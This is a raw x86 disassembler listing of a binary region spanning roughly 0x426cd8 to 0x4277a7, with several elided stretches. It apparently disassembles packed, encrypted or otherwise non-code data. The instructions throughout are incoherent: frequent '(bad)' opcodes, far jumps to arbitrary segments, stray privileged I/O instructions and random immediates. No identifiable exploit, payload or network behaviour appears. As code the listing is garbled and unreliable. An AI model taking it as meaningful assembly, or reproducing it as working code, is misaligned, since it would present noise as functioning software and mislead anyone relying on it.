  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xa390469b
  426ce6:	sahf   
  426ce7:	lahf   
  426ce8:	add    DWORD PTR [eax],eax
  426cea:	inc    DWORD PTR [eax]
  426cec:	add    BYTE PTR [eax],al
  426cee:	pusha  
  426cef:	fpatan 
  426cf1:	xchg   ebp,eax
  426cf2:	push   ebx
  426cf3:	cmp    eax,esi
  426cf5:	pop    eax
  426cf6:	xchg   ebx,eax
  426cf7:	shl    BYTE PTR [eax+0x5f],1
  426cfa:	push   ebp
  426cfb:	(bad)  
  426cfc:	dec    esp
  426cfd:	imul   edx,DWORD PTR [edx-0x19963a3a],0x6a2c6e03
  426d07:	jns    0x426d3d
  426d09:	ret    
  426d0a:	xor    eax,0x3166baae
  426d0f:	bound  ebx,QWORD PTR [eax]
  426d11:	pop    edx
  426d12:	sbb    ch,BYTE PTR [eax+0x25986ee3]
  426d18:	xchg   ebx,eax
  426d19:	stos   BYTE PTR es:[edi],al
  426d1a:	sub    eax,0xe8096038
  426d1f:	aas    
  426d20:	sbb    DWORD PTR [eax-0x21],0x6ac17674
  426d27:	lods   al,BYTE PTR ds:[esi]
  426d28:	mov    ah,BYTE PTR ds:0x843107af
  426d2e:	adc    bh,BYTE PTR [esi]
  426d30:	jge    0x426cc0
  426d32:	add    BYTE PTR [ebp-0x17],cl
  426d35:	popa   
  426d36:	add    BYTE PTR [eax+0x5ace524f],ch
  426d3c:	mov    BYTE PTR [edx+0x4abe0008],0xdd
  426d43:	loopne 0x426d5e
  426d45:	ds pop edx
  426d47:	push   edi
  426d48:	scas   eax,DWORD PTR es:[edi]
  426d49:	ins    BYTE PTR es:[edi],dx
  426d4a:	sbb    BYTE PTR [edx+edi*1],0x52
  426d4e:	popf   
  426d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d50:	int    0x3f
  426d52:	test   eax,0x105c0c33
  426d57:	das    
  426d58:	or     eax,DWORD PTR [ebp+0x2eca4f51]
  426d5e:	cmp    eax,0x2b27a93b
  426d63:	mov    edx,cs
  426d65:	jg     0x426d8d
  426d67:	cmp    DWORD PTR [esi-0x4b],edx
  426d6a:	sub    eax,0x8876e3af
  426d6f:	popf   
  426d70:	lods   al,BYTE PTR ds:[esi]
  426d71:	push   edi
  426d72:	sub    eax,0xe24e447c
  426d77:	mov    eax,0xc588888c
  426d7c:	imul   ebp,DWORD PTR [ecx+0x13a854d5],0x9a2f1d29
  426d86:	push   es
  426d87:	mov    ebp,0xe5b70b04
  426d8c:	mov    edi,ecx
  426d8e:	mov    ds:0x4794eaa5,al
  426d93:	aad    0xe7
  426d95:	dec    ecx
  426d96:	or     eax,0xf28a0ba6
  426d9b:	inc    ebp
  426d9c:	bound  ebx,QWORD PTR ds:0xdb8f09a6
  426da2:	imul   esi,eax,0x8ee69c55
  426da8:	sub    al,0xa8
  426daa:	pop    edi
  426dab:	push   es
  426dac:	cmp    eax,0xb7e6f191
  426db1:	xor    eax,0xb24fc884
  426db6:	sbb    edi,DWORD PTR [esi]
  426db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426db9:	sbb    ebx,esi
  426dbb:	and    DWORD PTR [esi+0x34],edi
  426dbe:	dec    eax
  426dbf:	repz mov ebp,fs
  426dc2:	mov    cl,bl
  426dc4:	adc    BYTE PTR [ecx-0x4c],0x59
  426dc8:	(bad)  
  426dc9:	push   eax
  426dca:	mov    bl,0x73
  426dcc:	arpl   WORD PTR [edi+ecx*8-0x61],bp
  426dd0:	jmp    0xf6885aff
  426dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dd6:	push   ds
  426dd7:	cld    
  426dd8:	sub    ecx,DWORD PTR [eax+0x85ff72a]
  426dde:	nop
  426ddf:	mov    ds:0xabb45eab,al
  426de4:	xchg   ebx,eax
  426de5:	mov    esp,edi
  426de7:	sbb    bl,BYTE PTR [edi]
  426de9:	mov    ebx,0x9c85b6
	...
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0x8b0c:0xc7c2ecf9
  426e63:	mul    ebx
  426e65:	sbb    ebx,DWORD PTR [ebp-0xfffe60]
  426e6b:	add    BYTE PTR [eax],al
  426e6d:	add    BYTE PTR [ebp+0x37c4bc6b],ch
  426e73:	xor    ebp,DWORD PTR [ecx+0x7eeb16da]
  426e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e7a:	jmp    0x803c0ab4
  426e7f:	mov    esi,0x449cb42c
  426e84:	xor    al,0x73
  426e86:	pop    ecx
  426e87:	jne    0x426ea4
  426e89:	lea    ebp,[esi]
  426e8b:	popf   
  426e8c:	xchg   DWORD PTR [esi+0x3c72c5d7],edi
  426e92:	mov    ds,WORD PTR [edi+0x4f6990e4]
  426e98:	cs nop
  426e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e9b:	mov    edx,0xaa21987b
  426ea0:	std    
  426ea1:	data16 mov BYTE PTR [edi+0x9],ch
  426ea5:	test   DWORD PTR [eax+0x2ec7be8f],edx
  426eab:	test   eax,0x9156e41f
  426eb0:	xchg   ecx,eax
  426eb1:	or     DWORD PTR [ebx-0x7d],edi
  426eb4:	jl     0x426e67
  426eb6:	xchg   edi,eax
  426eb7:	adc    al,0xd3
  426eb9:	pop    es
  426eba:	sar    DWORD PTR [ebp-0xce6166e],1
  426ec0:	stos   DWORD PTR es:[edi],eax
  426ec1:	int3   
  426ec2:	push   ecx
  426ec3:	loope  0x426eeb
  426ec5:	mov    esp,0x278fd56e
  426eca:	mov    es,WORD PTR fs:[edx]
  426ecd:	add    al,0xd5
  426ecf:	into   
  426ed0:	fstp   DWORD PTR [edx+0x506f66cf]
  426ed6:	ret    0x4c3f
  426ed9:	sbb    esi,DWORD PTR [ebx+0x501afb30]
  426edf:	sub    dl,BYTE PTR ds:0x20ad3953
  426ee5:	jl     0x426ec5
  426ee7:	or     dl,BYTE PTR [ebp+ebx*1-0x7a]
  426eeb:	sub    al,0xd8
  426eed:	mov    ch,0xec
  426eef:	pop    ebx
  426ef0:	cdq    
  426ef1:	ficomp DWORD PTR [esi+0x5e4fc45e]
  426ef7:	(bad)  
  426ef8:	arpl   WORD PTR [esi],bx
  426efa:	xchg   BYTE PTR ds:0x8b8462f7,dl
  426f00:	pop    esi
  426f01:	and    eax,0xbfea2fc5
  426f06:	adc    bl,al
  426f08:	jns    0x426ef6
  426f0a:	aaa    
  426f0b:	fsubr  DWORD PTR [ebx+0x7b]
  426f0e:	add    esp,DWORD PTR [edi+0x5]
  426f11:	jmp    0xf1ab2f1e
  426f16:	add    edi,0x896d1b58
  426f1c:	hlt    
  426f1d:	(bad)  
  426f1f:	push   esp
  426f20:	jp     0x426ed7
  426f22:	jecxz  0x426f1c
  426f24:	daa    
  426f25:	sub    DWORD PTR [ebp+0x1],0xffffff9d
  426f29:	jmp    0x4aa8:0x3026c5a
  426f30:	jbe    0x426ee7
  426f32:	or     al,0x6f
  426f34:	or     ebx,DWORD PTR [esi]
  426f36:	fiadd  WORD PTR [ecx]
  426f38:	sahf   
  426f39:	xchg   edx,eax
  426f3a:	sbb    ebx,DWORD PTR [ebp-0x24]
  426f3d:	mov    bh,0x8
  426f3f:	xchg   edx,eax
  426f40:	mov    esi,0x1fbf1d58
  426f45:	or     esp,esi
  426f47:	clc    
  426f48:	pop    ds
  426f49:	out    0x31,eax
  426f4b:	bound  edx,QWORD PTR [ebx]
  426f4d:	jecxz  0x426f82
  426f4f:	mov    ds:0x79d61e5c,eax
  426f54:	adc    ebx,DWORD PTR [edi+0xb]
  426f57:	mov    ss,WORD PTR [ebx]
  426f59:	jbe    0x426f84
  426f5b:	jae    0x426f82
  426f5d:	inc    esi
  426f5e:	cmp    BYTE PTR [ebp-0x7dcdc2c5],dl
  426f64:	loope  0x426f7f
  426f66:	lock push ecx
  426f68:	rol    edi,cl
  426f6a:	mov    WORD PTR [eax],cs
  426f6c:	pop    edx
	...
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [edi+ecx*8-0x63eef405],esp
  426fe7:	mov    eax,ds:0xff0001
  426fec:	add    BYTE PTR [eax],al
  426fee:	and    eax,0xbcb2f5f0
  426ff3:	cmc    
  426ff4:	rcr    BYTE PTR [edx+0x40e4cae7],0x5
  426ffb:	xor    DWORD PTR [edi+0x2b],0x64
  426fff:	push   0xa24efd28
  427004:	imul   ebp,DWORD PTR [edi+0x24],0xb2b0a899
  42700b:	fs and dl,bh
  42700e:	adc    al,0xa0
  427010:	adc    al,0xf2
  427012:	icebp  
  427013:	sub    DWORD PTR [edx-0x1a3b86ad],ecx
  427019:	adc    BYTE PTR [esi-0x7f9014c0],bh
  42701f:	and    DWORD PTR [esi-0x6fee3f30],esp
  427025:	gs push 0xd17d0000
  42702b:	imul   BYTE PTR [ebx-0x30]
  42702e:	mov    ch,ch
  427030:	hlt    
  427031:	daa    
  427032:	sub    DWORD PTR [edi-0x79],ebx
  427035:	loop   0x426ff7
  427037:	inc    eax
  427038:	out    0xd5,al
  42703a:	sub    ch,BYTE PTR [ecx]
  42703c:	test   BYTE PTR [edx-0x42034ae7],0x60
  427043:	lock test BYTE PTR [ebx-0x4a],0xce
  427048:	mov    eax,0xd9e01273
  42704d:	ins    BYTE PTR es:[edi],dx
  42704e:	dec    ebx
  42704f:	sbb    BYTE PTR [esi],dh
  427051:	mov    ebp,edi
  427053:	js     0x427016
  427055:	or     DWORD PTR [edx-0x7e],0xd126fb5e
  42705c:	(bad)  
  42705e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42705f:	or     DWORD PTR [ebx-0x30],ecx
  427062:	and    BYTE PTR [edi],ah
  427064:	lods   al,BYTE PTR ds:[esi]
  427065:	xor    esp,edx
  427067:	xor    ebx,ebx
  427069:	pop    edi
  42706a:	cmp    eax,0x2a373e4f
  42706f:	mov    eax,0x67b0df98
  427074:	adc    bh,bl
  427076:	xchg   esi,eax
  427077:	push   edx
  427078:	push   ss
  427079:	adc    DWORD PTR [esi+0x72],0x38b88bec
  427080:	pop    ds
  427081:	xor    DWORD PTR [esi],esi
  427083:	cdq    
  427084:	jmp    0xf2c13ada
  427089:	jmp    0x47c8:0xe3c0bd91
  427090:	iret   
  427091:	adc    al,0x36
  427093:	mov    ds:0xf0e72f65,al
  427098:	aas    
  427099:	nop
  42709a:	lahf   
  42709b:	xor    ecx,DWORD PTR [ebx+ebp*4+0x614cdefa]
  4270a2:	fsub   QWORD PTR [edx]
  4270a4:	mov    al,0xd1
  4270a6:	popf   
  4270a7:	in     al,dx
  4270a8:	cmp    ecx,DWORD PTR [esp]
  4270ab:	pop    ds
  4270ac:	addr16 mov eax,ds:0x633f
  4270b0:	push   esi
  4270b1:	push   esp
  4270b2:	cmp    al,0x56
  4270b4:	sbb    al,0xbc
  4270b6:	pusha  
  4270b7:	lahf   
  4270b8:	cmp    eax,0xd03ebbb3
  4270bd:	icebp  
  4270be:	dec    edx
  4270bf:	retf   
  4270c0:	add    al,0x3e
  4270c2:	jne    0x4270f0
  4270c4:	jb     0x4270dd
  4270c6:	push   ebp
  4270c7:	lahf   
  4270c8:	mov    edx,DWORD PTR [edi+ebx*8]
  4270cb:	ror    DWORD PTR [ecx-0x5adf5066],1
  4270d1:	add    eax,0x1a621d0d
  4270d6:	sub    BYTE PTR [edi],ah
  4270d8:	cdq    
  4270d9:	sbb    BYTE PTR [eax],dl
  4270db:	push   0x3708460b
  4270e0:	dec    ebp
  4270e1:	sti    
  4270e2:	pop    eax
  4270e3:	inc    edi
  4270e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270e5:	or     al,ah
  4270e7:	scas   al,BYTE PTR es:[edi]
  4270e8:	ins    BYTE PTR es:[edi],dx
  4270e9:	and    esi,DWORD PTR [ebx+0xc216]
	...
  427153:	add    BYTE PTR [eax],al
  427155:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42715c:	(bad)  
  42715d:	std    
  42715e:	inc    esp
  42715f:	mov    ebp,0x348b9d96
  427164:	sub    al,0xbe
  427166:	fwait
  427167:	mov    ds:0xff0001,al
  42716c:	add    BYTE PTR [eax],al
  42716e:	sub    eax,0x6cb8624e
  427173:	dec    edi
  427174:	call   0xb0ff1889
  427179:	and    al,0x61
  42717b:	ret    0xb33a
  42717e:	rcl    DWORD PTR [eax],cl
  427180:	(bad)  
  427181:	nop
  427182:	ins    DWORD PTR es:[edi],dx
  427183:	stos   DWORD PTR es:[edi],eax
  427184:	and    BYTE PTR [esi+0x5b9ae503],al
  42718a:	aaa    
  42718b:	(bad)  
  42718c:	mov    bh,0xf1
  42718e:	bound  ebx,QWORD PTR [eax-0x146bdf5f]
  427194:	je     0x427137
  427196:	inc    ecx
  427197:	js     0x42715a
  427199:	add    DWORD PTR [ebx+0x43f50db2],ebp
  42719f:	jbe    0x4271fe
  4271a1:	dec    ebp
  4271a2:	add    ebx,DWORD PTR ds:0xfa517f67
  4271a8:	sub    edx,DWORD PTR ds:0x52a55712
  4271ae:	loope  0x427221
  4271b0:	iret   
  4271b1:	cmp    ebx,esp
  4271b3:	ins    DWORD PTR es:[edi],dx
  4271b4:	mov    edx,0x9d64164e
  4271b9:	rcl    BYTE PTR [edx-0x5dd6a54d],1
  4271bf:	adc    DWORD PTR [ebx-0x7ac7db64],ecx
  4271c5:	lds    edi,FWORD PTR [edx-0x5d]
  4271c8:	inc    eax
  4271c9:	jmp    0x67e29ba2
  4271ce:	test   DWORD PTR [ebx],ebp
  4271d0:	loope  0x4271b5
  4271d2:	pop    ebp
  4271d3:	(bad)  
  4271d4:	or     eax,0xd3433924
  4271d9:	sbb    ah,BYTE PTR [ebx-0x3b]
  4271dc:	shl    DWORD PTR [ecx+0x58],cl
  4271df:	jb     0x4271f9
  4271e1:	mov    ds:0xf81056f8,al
  4271e6:	mov    DWORD PTR [edi],eax
  4271e8:	stos   DWORD PTR es:[edi],eax
  4271e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271ea:	mov    edx,0x50ea10ad
  4271ef:	pushf  
  4271f0:	imul   edx
  4271f2:	adc    al,BYTE PTR [edi]
  4271f4:	jmp    0x6ba8:0x1f29e675
  4271fb:	cmc    
  4271fc:	adc    DWORD PTR [edx],0xa1bd1b41
  427202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427203:	loope  0x4271b8
  427205:	adc    al,0x92
  427207:	mov    ds:0x7ab1b20e,eax
  42720c:	jo     0x4271d4
  42720e:	cdq    
  42720f:	pop    eax
  427210:	shl    BYTE PTR [eax],0x66
  427213:	inc    esi
  427214:	jbe    0x427215
  427216:	push   ds
  427217:	push   cs
  427218:	imul   edi,DWORD PTR [esi+ecx*8+0xb1955b3],0xffffff8b
  427220:	fld    st(3)
  427222:	repz adc ah,BYTE PTR [edx+eiz*1-0x4444a7f9]
  42722a:	gs ins BYTE PTR es:[edi],dx
  42722c:	sti    
  42722d:	sbb    ebp,DWORD PTR [esp+eiz*2]
  427230:	(bad)  
  427232:	mov    dh,0x55
  427234:	inc    edi
  427235:	fldcw  WORD PTR [edx]
  427237:	mov    eax,0xeb5495fe
  42723c:	sahf   
  42723d:	sub    al,0xb
  42723f:	or     BYTE PTR [edi],dh
  427241:	or     al,0x72
  427243:	sub    al,0x7e
  427245:	xor    DWORD PTR [esp+edi*1],edi
  427248:	jl     0x427219
  42724a:	leave  
  42724b:	call   0x9f036bb
  427250:	sbb    DWORD PTR [ecx+0x1f8114f0],ecx
  427256:	xlat   BYTE PTR ds:[ebx]
  427257:	sbb    esi,DWORD PTR [ebx]
  427259:	pop    ebx
  42725a:	sbb    eax,0x86e386b0
  42725f:	push   0xfffffff0
  427261:	icebp  
  427262:	mov    edx,0x795e7d9d
  427267:	es mov dh,0xc3
  42726a:	test   eax,0x450c
	...
  4272d3:	add    BYTE PTR [eax],al
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0x88ab8381,al
  4272e6:	call   0x0:0xff0001a3
  4272ed:	add    BYTE PTR [esp+ecx*8],ah
  4272f0:	imul   ebx,DWORD PTR [esi-0x3c],0xffffff8c
  4272f4:	mov    esp,0xefc625c6
  4272f9:	mov    eax,0x1f37fb5c
  4272fe:	fcomp  st(3)
  427300:	inc    edx
  427301:	dec    ebp
  427302:	or     eax,0x3c39a5e9
  427307:	sub    dl,BYTE PTR [edi-0x35]
  42730a:	jmp    0x1fdc:0x4005af21
  427311:	(bad)  
  427312:	mov    ebx,0xb4688205
  427317:	lods   eax,DWORD PTR ds:[esi]
  427318:	xchg   ebx,eax
  427319:	jge    0x4272d0
  42731b:	aam    0x5b
  42731d:	fiadd  DWORD PTR ds:0x38771b67
  427323:	mov    ah,0xbf
  427325:	mov    gs,ecx
  427327:	pop    ss
  427328:	fdiv   QWORD PTR [eax-0x549f9ae7]
  42732e:	(bad)  [edx]
  427330:	sahf   
  427331:	pop    ebp
  427332:	sbb    esp,eax
  427334:	add    edx,0xfa8af7ae
  42733a:	test   al,0x19
  42733c:	mov    ebx,0xb3d3fb12
  427341:	les    esi,FWORD PTR [ebp-0x76]
  427344:	call   0xf19c7489
  427349:	pop    eax
  42734a:	out    dx,eax
  42734b:	and    edx,DWORD PTR [edi-0x31]
  42734e:	in     al,dx
  42734f:	fld    QWORD PTR [ebp+0x17]
  427352:	add    BYTE PTR [edx],0xd1
  427355:	push   dx
  427357:	sti    
  427358:	ror    BYTE PTR [ecx+0x3dd7d673],cl
  42735e:	add    BYTE PTR [esi],dh
  427360:	or     edx,DWORD PTR ds:0xa69f1b85
  427366:	and    BYTE PTR [eax+edx*1-0x35],ah
  42736a:	xchg   BYTE PTR [ebp+eiz*4+0x1d],dl
  42736e:	rcr    DWORD PTR [edi+0x68a6daf7],cl
  427374:	push   cs
  427375:	adc    al,0x73
  427377:	int3   
  427378:	add    ebp,DWORD PTR [ebp+0x4b]
  42737b:	test   al,0x9a
  42737d:	sahf   
  42737e:	daa    
  42737f:	mov    ebx,0xbc458138
  427384:	or     BYTE PTR [ecx],bl
  427386:	test   eax,0x699dc36e
  42738b:	lea    ebp,[edi+eax*8-0x47]
  42738f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427390:	adc    al,BYTE PTR [ecx-0x42]
  427393:	je     0x427383
  427395:	rol    DWORD PTR [ebx+0x48],cl
  427398:	jmp    0xf7c5c94b
  42739d:	or     BYTE PTR [edi+0x2af49c67],ah
  4273a3:	xchg   esi,eax
  4273a4:	int3   
  4273a5:	jbe    0x4273c9
  4273a7:	data16 fscale 
  4273aa:	mov    al,bl
  4273ac:	ficomp WORD PTR [eax-0x728e6809]
  4273b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273b3:	xchg   edi,eax
  4273b5:	cmp    esi,DWORD PTR [ecx+0x7a]
  4273b8:	sbb    eax,0xd4b31b66
  4273bd:	jmp    0x6f25:0xb9a8aca1
  4273c4:	lea    ebp,[ecx+edi*2-0x1d]
  4273c8:	stos   BYTE PTR es:[edi],al
  4273c9:	push   edx
  4273ca:	add    al,BYTE PTR [edx-0x13a8902b]
  4273d0:	and    eax,0x51c469ec
  4273d5:	nop
  4273d6:	xchg   BYTE PTR es:[ebp-0x8],dh
  4273da:	mov    eax,ds:0x33f907a3
  4273df:	mov    BYTE PTR [ebx],bl
  4273e1:	mov    ebx,0xdfb0d6d
  4273e6:	push   cs
  4273e7:	cld    
  4273e8:	pusha  
  4273e9:	jecxz  0x42740d
  4273eb:	xor    al,0xca
	...
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    eax,DWORD PTR ds:0x99575460
  427467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427468:	add    DWORD PTR [eax],eax
  42746a:	inc    DWORD PTR [eax]
  42746c:	add    BYTE PTR [eax],al
  42746e:	and    eax,0xb851d76e
  427473:	inc    eax
  427474:	clc    
  427475:	shl    DWORD PTR [edi-0x328dd856],0x45
  42747c:	mov    dh,0xa4
  42747e:	mov    al,ds:0x1c33d4f3
  427483:	lds    edi,FWORD PTR [esi]
  427485:	clc    
  427486:	jl     0x427419
  427488:	pop    ss
  427489:	jecxz  0x427444
  42748b:	xor    BYTE PTR [ebx-0x45e46e69],cl
  427491:	(bad)  [eax+0x5c]
  427494:	sbb    al,0xf2
  427496:	mov    ch,0x66
  427498:	jne    0x4274c6
  42749a:	(bad)  
  42749b:	mov    ds:0x8ec4b865,eax
  4274a0:	int    0x4e
  4274a2:	call   0x7fe8dee8
  4274a7:	mov    al,0x29
  4274a9:	repz gs mov eax,0x2e6bad94
  4274b0:	popf   
  4274b1:	rcr    BYTE PTR [edi-0x170b9277],0xfc
  4274b8:	in     eax,dx
  4274b9:	pop    esi
  4274ba:	inc    ecx
  4274bb:	sub    ch,al
  4274bd:	loopne 0x42750c
  4274bf:	xchg   ebx,eax
  4274c0:	jmp    0x5ebb8199
  4274c5:	out    0x5e,eax
  4274c7:	scas   eax,DWORD PTR es:[edi]
  4274c8:	pop    ds
  4274c9:	call   0xa50402c8
  4274ce:	sbb    bh,ah
  4274d0:	loop   0x4274e2
  4274d2:	or     eax,0x9980aa69
  4274d7:	call   0x63a43456
  4274dc:	lock daa 
  4274de:	inc    ebp
  4274df:	jp     0x4274c0
  4274e1:	mov    esi,0x3a49ff98
  4274e6:	in     eax,dx
  4274e7:	not    al
  4274e9:	das    
  4274ea:	test   BYTE PTR [ebp+0x44ffb12a],dl
  4274f0:	dec    esp
  4274f1:	stos   DWORD PTR es:[edi],eax
  4274f2:	setg   al
  4274f5:	mov    dh,0x8d
  4274f7:	cmovns edi,eax
  4274fa:	sahf   
  4274fb:	stos   DWORD PTR es:[edi],eax
  4274fc:	pop    esp
  4274fd:	pop    ecx
  4274fe:	or     WORD PTR [edi-0x2d0c8f0a],sp
  427505:	xchg   esp,eax
  427506:	push   es
  427507:	cli    
  427508:	stos   DWORD PTR es:[edi],eax
  427509:	call   0xc90ff1c6
  42750e:	pop    ebp
  42750f:	lods   eax,DWORD PTR ds:[esi]
  427510:	mov    BYTE PTR [eax+0x1498e1df],bl
  427516:	cdq    
  427517:	in     eax,dx
  427518:	sbb    ebp,DWORD PTR [ebx+0xc3383cf]
  42751e:	out    0x45,eax
  427520:	or     al,BYTE PTR [ebx]
  427522:	adc    DWORD PTR ds:[ebp+esi*2+0x1f],0x3e151704
  42752b:	scas   al,BYTE PTR es:[edi]
  42752c:	and    eax,0xa9ae9e4a
  427531:	jbe    0x427596
  427533:	pop    ecx
  427534:	jns    0x4274c2
  427536:	xchg   esi,esp
  427538:	dec    ebp
  427539:	daa    
  42753a:	push   cs
  42753b:	imul   ecx,DWORD PTR [esi+ebp*8+0x49],0x8028b99a
  427543:	sub    al,0x0
  427545:	pop    ebp
  427546:	jb     0x42754a
  427548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42754a:	mov    es,WORD PTR [ebp+ebx*4-0x785650fe]
  427551:	cld    
  427552:	jecxz  0x427599
  427554:	adc    DWORD PTR [edi-0x7f03ab17],0x4abee6f9
  42755e:	xor    DWORD PTR [esi-0x3d],eax
  427561:	int    0x3c
  427563:	push   eax
  427564:	js     0x42750c
  427566:	pop    ecx
  427567:	ins    BYTE PTR es:[edi],dx
  427568:	arpl   WORD PTR [ebx+0xc72e85],bp
	...
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	pop    eax
  4275e3:	or     bl,BYTE PTR [ecx]
  4275e5:	hlt    
  4275e6:	cwde   
  4275e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	inc    DWORD PTR [eax]
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	jl     0x4275ec
  4275f0:	push   cs
  4275f1:	(bad)
  4275f4:	jmp    0xa90:0x61727b9
  4275fb:	or     DWORD PTR [edi],edi
  4275fd:	(bad)  
  4275fe:	jno    0x427595
  427600:	sti    
  427601:	xchg   BYTE PTR [eax-0x61234715],ch
  427607:	adc    eax,0x8aa58a73
  42760c:	push   es
  42760d:	fcom   QWORD PTR [ebp+0x2e]
  427610:	pop    edx
  427611:	sti    
  427612:	test   esi,0xdeb2b738
  427618:	ins    DWORD PTR es:[edi],dx
  427619:	bound  edx,QWORD PTR [esi]
  42761b:	out    0x64,eax
  42761d:	fild   QWORD PTR [eax-0x23]
  427620:	ja     0x42760c
  427622:	mov    bl,0x1
  427624:	sub    ebx,edi
  427626:	push   ss
  427627:	adc    DWORD PTR [ebx+0x24c61357],ebx
  42762d:	cld    
  42762e:	pop    edx
  42762f:	rcr    DWORD PTR [ebx],cl
  427631:	or     eax,0xcfe7ba07
  427636:	lahf   
  427637:	adc    BYTE PTR [bp+si-0x1e],ah
  42763b:	and    bl,BYTE PTR [esi]
  42763d:	mov    BYTE PTR [ebx],al
  42763f:	mov    ebx,0x9efd8cfb
  427644:	(bad)  
  427645:	int    0xe5
  427647:	aad    0x2b
  427649:	or     al,0xe2
  42764b:	out    dx,eax
  42764c:	cmp    edx,eax
  42764e:	add    cl,BYTE PTR [esi+edx*4-0x3f99d5bc]
  427655:	es mov esi,0x69656c6e
  42765b:	jmp    0x1fca:0x4eeed1c0
  427662:	adc    DWORD PTR [ebx+0x38b21aca],0x60
  427669:	sti    
  42766a:	icebp  
  42766b:	call   DWORD PTR [esi+0x28595bfd]
  427671:	and    eax,0x6e7b749a
  427676:	dec    ebx
  427677:	cli    
  427678:	arpl   WORD PTR [ecx+0x79],bx
  42767b:	pusha  
  42767c:	pop    esi
  42767d:	adc    BYTE PTR [esi-0x79],bl
  427680:	jbe    0x42767e
  427682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427683:	(bad)  
  427684:	aam    0x3a
  427686:	mov    ah,0xbe
  427688:	push   ds
  427689:	aaa    
  42768a:	pop    esi
  42768c:	pop    ss
  42768d:	lea    edx,[edx-0x12904271]
  427693:	test   BYTE PTR es:[eax+0x62],ch
  427697:	aaa    
  427698:	adc    esp,DWORD PTR [esi]
  42769a:	fist   DWORD PTR [ecx-0x39]
  42769d:	and    edi,DWORD PTR [ebx]
  42769f:	xor    ebx,ecx
  4276a1:	out    dx,al
  4276a2:	dec    ecx
  4276a3:	dec    ebx
  4276a4:	iret   
  4276a5:	pop    ebx
  4276a6:	or     DWORD PTR [ebx],0x46
  4276a9:	addr16 pop ecx
  4276ab:	lods   al,BYTE PTR ds:[esi]
  4276ac:	cmpxchg BYTE PTR [edi+0x57b1e714],bh
  4276b3:	mov    dh,0x78
  4276b5:	test   al,0xa5
  4276b7:	mov    fs,WORD PTR [esi]
  4276b9:	jb     0x4276a6
  4276bb:	sbb    eax,0x169469f
  4276c0:	push   ebx
  4276c1:	aam    0x6d
  4276c3:	shr    BYTE PTR [edi+0x1b],cl
  4276c6:	(bad)  
  4276c7:	daa    
  4276c8:	ret    
  4276c9:	cmc    
  4276ca:	fst    DWORD PTR [edi+0xa]
  4276cd:	cdq    
  4276ce:	mov    dx,?
  4276d1:	mov    eax,ds:0x813afa2
  4276d6:	repz inc ecx
  4276d8:	sub    BYTE PTR [edi-0x18],cl
  4276db:	jmp    0x3033:0x8fae6060
  4276e2:	jo     0x4276db
  4276e4:	rol    ah,0xe1
  4276e7:	shl    dl,1
  4276e9:	mov    sp,0x6ec7
	...
  427755:	add    BYTE PTR [ecx],al
  427757:	push   esi
  427758:	nop
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fst    DWORD PTR [ebp+0x33]
  427764:	xchg   esp,eax
  427765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427766:	xchg   edi,eax
  427767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	inc    DWORD PTR [eax]
  42776c:	add    BYTE PTR [eax],al
  42776e:	sub    esp,DWORD PTR [esi]
  427770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427771:	pop    esi
  427772:	fimul  DWORD PTR [eax]
  427774:	dec    edx
  427775:	pop    ss
  427776:	lods   al,BYTE PTR ds:[esi]
  427777:	sub    ebx,edi
  427779:	pop    edx
  42777a:	js     0x427799
  42777c:	les    edi,FWORD PTR [esp+ebx*1-0x36]
  427780:	cmp    eax,0xf7c6a5c7
  427785:	or     eax,0x1ce50e78
  42778a:	mov    ch,0x57
  42778c:	adc    BYTE PTR [edi],ch
  42778e:	cmp    DWORD PTR [ebx+0x21],ecx
  427791:	sbb    BYTE PTR [edx+ecx*4+0x60],bh
  427795:	dec    ecx
  427796:	fs jno 0x42773a
  427799:	sub    DWORD PTR [edi-0x68eec9de],ebp
  42779f:	popa   
  4277a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277a1:	jno    0x427784
  4277a3:	push   0xffffff92
  4277a5:	(bad)  
  4277a6:	push   ecx
  4277a7:	test   DWORD PTR ds:0xf13e3f3c,ebp
